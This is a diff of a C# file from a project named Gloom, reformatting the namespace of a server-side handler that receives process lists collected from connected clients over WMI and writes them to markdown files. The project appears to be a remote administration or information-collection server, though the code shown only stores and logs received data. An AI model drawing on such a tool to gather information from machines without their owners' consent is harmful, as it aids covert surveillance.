@@ -2,28 +2,30 @@
 using Serilog;
 using System.Text;
 
-namespace Gloom.Server.Features.InfoCollector.Wmi;
-internal class WmiProcessList : WmiInfo
+namespace Gloom.Server.Features.InfoCollector.Wmi
 {
-	public WmiProcessList() : base("ps", WmiOpCodes.ProcessList)
+	internal class WmiProcessList : WmiInfo
 	{
-	}
-
-	public override async Task Handle(Client client, byte[] data)
-	{
-		var rsp = data.Deserialize<ProcessListResponse>();
-		var fileName = $"Process list of {client.Name} at {DateTime.Now:yyyy-MM-dd-HH-mm-ss-ffff}.md";
-		try
+		public WmiProcessList() : base("ps", WmiOpCodes.ProcessList)
 		{
-			using var fw = new StreamWriter(fileName, false, new UTF8Encoding(false), 8192);
-
-			fw.WriteLine("# Processses");
-			fw.WriteLine(rsp.List.ToMarkdownTable());
-			Log.Information("Process list of {client} written to {path}.", client, fileName);
 		}
-		catch (Exception ex)
+
+		public override async Task Handle(Client client, byte[] data)
 		{
-			Log.Error(ex, "Exception during handling of wmi process list response.");
+			var rsp = data.Deserialize<ProcessListResponse>();
+			var fileName = $"Process list of {client.Name} at {DateTime.Now:yyyy-MM-dd-HH-mm-ss-ffff}.md";
+			try
+			{
+				using var fw = new StreamWriter(fileName, false, new UTF8Encoding(false), 8192);
+
+				fw.WriteLine("# Processses");
+				fw.WriteLine(rsp.List.ToMarkdownTable());
+				Log.Information("Process list of {client} written to {path}.", client, fileName);
+			}
+			catch (Exception ex)
+			{
+				Log.Error(ex, "Exception during handling of wmi process list response.");
+			}
 		}
 	}
 }
